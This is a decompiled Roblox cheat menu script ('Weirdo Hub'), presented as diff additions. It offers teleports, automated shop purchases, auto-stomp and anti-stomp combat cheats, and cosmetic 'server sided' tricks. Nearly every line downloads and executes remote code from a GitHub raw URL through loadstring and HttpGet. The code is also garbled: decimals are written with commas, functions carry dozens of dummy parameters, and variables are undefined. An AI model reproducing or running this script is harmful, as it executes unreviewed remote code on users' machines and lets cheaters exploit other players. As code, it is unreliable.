+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Building Near Bank #2 E", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -440,64288330078
+  d = 80,475311279297
+  e = -220,69586181641
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Empty Pool", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -845,99987792969
+  d = 21,800006866455
+  e = -280,29000854492
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Playground Food Shack", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -278,38232421875
+  d = 22,649866104126
+  e = -804,705078125
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Police Station Area #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -245,13682556152
+  d = 21,799953460693
+  e = -91,411743164063
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Police Station Area #3", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -264,81039428711
+  d = 21,799951553345
+  e = -74,137733459473
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Safe AFK #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 310,38958740234
+  d = 48,004989624023
+  e = -883,97509765625
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Safe AFK #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -861,56481933594
+  d = -39,404216766357
+  e = -1132,5791015625
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Safe AFK #3", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -833,5869140625
+  d = -3,6492006778717
+  e = -680,61407470703
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Safe AFK #4 / BEST!", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 204,69744873047
+  d = 38,249988555908
+  e = 200000,09375
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Unnamed Building #1", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = 438,80780029297
+  d = 54,557632446289
+  e = -733,51055908203
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Unnamed Building #2", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -104,86197662354
+  d = 28,310289382935
+  e = -1125,8115234375
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddLabel("Save and Load")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Save", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  a = a.Character
+  b = a
+  a = a.FindFirstChild
+  c = "HumanoidRootPart"
+  a = a(b, c)
+  a = a.CFrame
+  a = a.X
+  X1 = a
+  a = plr
+  a = a.Character
+  b = a
+  a = a.FindFirstChild
+  c = "HumanoidRootPart"
+  a = a(b, c)
+  a = a.CFrame
+  a = a.Y
+  Y1 = a
+  a = plr
+  a = a.Character
+  b = a
+  a = a.FindFirstChild
+  c = "HumanoidRootPart"
+  a = a(b, c)
+  a = a.CFrame
+  a = a.Z
+  Z1 = a
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Load", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = X1
+  d = Y1
+  d = d + 5
+  e = Z1
+  b = b(c, d, e)
+  a.CFrame = b
+end)
+for fn, fr in pairs(workspace.Ignored.Shop:GetChildren()) do
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Buy").AddButton(fr.Name, function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT)
+    a = a
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.HumanoidRootPart
+    a = a.Position
+    b = game
+    b = b.Workspace
+    b = b.Ignored
+    b = b.Shop
+    c = va
+    c = c.Name
+    b = b[c]
+    c = game
+    c = c.Players
+    c = c.LocalPlayer
+    c = c.Character
+    c = c.HumanoidRootPart
+    d = b.Head
+    d = d.CFrame
+    e = Vector3
+    e = e.new
+    g = 0
+    h = 3
+    j = 0
+    e = e(g, h, j)
+    d = d + e
+    c.CFrame = d
+    c = game
+    c = c.Players
+    c = c.LocalPlayer
+    c = c.Character
+    c = c.HumanoidRootPart
+    c = c.Position
+    d = b.Head
+    d = d.Position
+    c = c - d
+    c = c.Magnitude
+    if c <= 50 then
+      c = wait
+      d = 0,2
+      c(d)
+      c = fireclickdetector
+      e = b
+      d = b.FindFirstChild
+      g = "ClickDetector"
+      d = d(e, g)
+      e = 4
+      c(d, e)
+      c = game
+      c = c.Players
+      c = c.LocalPlayer
+      c = c.Character
+      c = c.HumanoidRootPart
+      d = CFrame
+      d = d.new
+      e = a
+      d = d(e)
+      c.CFrame = d
+    end
+  end)
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Combat").AddButton("FreeFist V1 ( U )", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  b = a.Character
+  d = a
+  c = a.GetMouse
+  c = c(d)
+  d = false
+  e = b.LeftHand
+  g = b.RightHand
+  h = game
+  j = h
+  h = h.GetService
+  k = "UserInputService"
+  h = h(j, k)
+  function j(a)
+    a = a
+    a = va
+    a.CFrame = CFrame.new(vb.Hit.p)
+    a = vc
+    a.CFrame = CFrame.new(vb.Hit.p)
+  end
+  k = nil
+  function l(a, b)
+    a = a
+    a = game
+    b = a
+    a = a.GetService
+    a = a(b, "RunService")
+    a = a.Heartbeat
+    b = a
+    a = a.Connect
+    a = a(b, vb)
+    va = a
+  end
+  function m(a, b, c)
+    a = a
+    a = va
+    b = a
+    a = a.Disconnect
+    a(b)
+  end
+  o = c.KeyDown
+  p = o
+  o = o.connect
+  function n(a)
+    a = a
+    if a == "u" then
+      if va == false then
+        va = true
+        vb()
+        pcall(function(a)
+          a = a
+          a = va
+          a = a.RightHand
+          a = a.RightWrist
+          a = a.Remove
+          a(a)
+          a = va
+          a = a.LeftHand
+          a = a.LeftWrist
+          a = a.Remove
+          a(a)
+        end)
+      elseif va == true then
+        va = false
+        vd()
+        Instance.new("Motor6D").Name = "RightWrist"
+        Instance.new("Motor6D").Parent = vc.RightHand
+        Instance.new("Motor6D").C0 = CFrame.new(1,18422506E-07, -0,5009287, -6,81715525E-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        Instance.new("Motor6D").C1 = CFrame.new(3,55267503E-07, 0,125045404, 5,92112528E-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        Instance.new("Motor6D").Part0 = vc.RightLowerArm
+        Instance.new("Motor6D").Part1 = vc.RightHand
+        Instance.new("Motor6D").Name = "LeftWrist"
+        Instance.new("Motor6D").Parent = vc.LeftHand
+        Instance.new("Motor6D").C0 = CFrame.new(0,000475466368, -0,5009287, 7,59417072E-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        Instance.new("Motor6D").C1 = CFrame.new(0,000475821638, 0,125045404, 5,92112528E-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        Instance.new("Motor6D").Part0 = vc.LeftLowerArm
+        Instance.new("Motor6D").Part1 = vc.LeftHand
+      end
+    end
+  end
+  o(p, n)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Combat").AddButton("FreeFist V2 ( T )", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  b = game
+  c = b
+  b = b.GetService
+  d = "Players"
+  b = b(c, d)
+  b = b.LocalPlayer
+  c = b.Character
+  e = b
+  d = b.GetMouse
+  d = d(e)
+  e = false
+  g = c.LeftHand
+  h = c.RightHand
+  for m, o in next, k(l) do
+    n = o
+    p = o.IsA
+    r = "Seat"
+    p = p(n, r)
+    if p then
+      n = o
+      p = o.Destroy
+      p(n)
+    end
+  end
+  j(k)
+  function m(a, b, c, d)
+    a = a
+    a = va
+    b = a
+    a = a.Disconnect
+    a(b)
+  end
+  o = d.KeyDown
+  p = o
+  o = o.connect
+  function n(a)
+    a = a
+    if a == "t" then
+      if va == false then
+        va = true
+        vb()
+      elseif va == true then
+        va = false
+        vc()
+        vd.Character.LeftHand.CFrame = vd.Character.LeftLowerArm.CFrame
+        vd.Character.RightHand.CFrame = vd.Character.RightLowerArm.CFrame
+      end
+    end
+  end
+  o(p, n)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Combat").AddButton("Anti Stomp", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI)
+  a = a
+  a = pcall
+  function b(a)
+    a = a
+    a = tostring
+    a = a(game.PlaceId)
+    if a == "2788229376" then
+      a = game
+      a = a.GetService
+      a = a(a, "CorePackages")
+      game:GetService("RunService"):BindToRenderStep("rrrrrrrrrrr", 2000, function(a)
+        a = a
+        a = pcall
+        a(function(a)
+          if a <= 5 then
+            for fd, fe in a(game.Players.LocalPlayer.Character:GetDescendants()) do
+              if fe:IsA("BasePart") then
+                fe:Destroy()
+              end
+            end
+          end
+        end)
+      end)
+    end
+  end
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Combat").AddButton("Auto Stomp ( H )", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO)
+  a = a
+  a = false
+  autostomp = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "RunService"
+  a = a(b, c)
+  a = a.Stepped
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    a = autostomp
+    if a then
+      a = game
+      a = a.ReplicatedStorage
+      a = a.MainEvent
+      a = a.FireServer
+      a(a, "Stomp")
+    end
+  end
+  a(b, c)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  b = a
+  a = a.GetMouse
+  a = a(b)
+  mouse = a
+  a = mouse
+  a = a.KeyDown
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    if a == "h" then
+      autostomp = not autostomp
+      game.ReplicatedStorage.MainEvent:FireServer("Stomp")
+    end
+  end
+  a(b, c)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Combat").AddToggle("Reach", false, function(a)
+  a = a
+  fistreac = false
+  if a then
+    fistreac = true
+    while fistreac == true do
+      wait()
+    end
+  else
+    fistreac = false
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddLabel("Funny Stuff XD")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Headless - Server Sided", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  b = a.Character
+  b = b.Head
+  c = b
+  b = b.BreakJoints
+  b(c)
+  b = a.Character
+  b = b.Head
+  c = Vector3
+  c = c.new
+  d = 0
+  e = 999999999999
+  g = 0
+  c = c(d, e, g)
+  b.Position = c
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Right Korblox - Server Sided", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.RightUpperLeg
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.RightLeg
+  b = a
+  a = a.Destroy
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Left Korblox - Server Sided", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.LeftUpperLeg
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.LeftLeg
+  b = a
+  a = a.Destroy
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Broken Neck - Server Sided", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG)
+  a = a
+  a = va
+  a = a.Character
+  a = a.Head
+  b = a
+  a = a.BreakJoints
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Suicide - Server Sided", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH)
+  a = a
+  a = game
+  a = a.ReplicatedStorage
+  a = a.DefaultChatSystemChatEvents
+  a = a.SayMessageRequest
+  b = a
+  a = a.FireServer
+  c = "Goodbye World..."
+  d = "All"
+  a(b, c, d)
+  a = wait
+  b = 1
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.UpperTorso
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Head
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.RightUpperLeg
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.RightLeg
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.LeftUpperLeg
+  b = a
+  a = a.Destroy
+  a(b)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.LeftLeg
+  b = a
+  a = a.Destroy
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Rejoin", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  b = a
+  a = a.GetPlayers
+  a = a(b)
+  a = #a
+  if a <= 1 then
+    a = game
+    b = a
+    a = a.GetService
+    c = "TeleportService"
+    a = a(b, c)
+    b = a
+    a = a.Teleport
+    c = game
+    c = c.PlaceId
+    d = game
+    e = d
+    d = d.GetService
+    g = "Players"
+    d = d(e, g)
+    d = d.LocalPlayer
+    a(b, c, d)
+  else
+    a = game
+    b = a
+    a = a.GetService
+    c = "TeleportService"
+    a = a(b, c)
+    b = a
+    a = a.TeleportToPlaceInstance
+    c = game
+    c = c.PlaceId
+    d = game
+    d = d.JobId
+    e = game
+    g = e
+    e = e.GetService
+    h = "Players"
+    e = e(g, h)
+    e = e.LocalPlayer
+    a(b, c, d, e)
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Professional FOV", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK)
+  a = a
+  a = Workspace
+  a = a.CurrentCamera
+  a.FieldOfView = 100
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Funny Stuff").AddButton("Normal FOV", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL)
+  a = a
+  a = Workspace
+  a = a.CurrentCamera
+  a.FieldOfView = 70
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Toy Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=782843345"
+  b = a.run
+  b = b.RunAnim
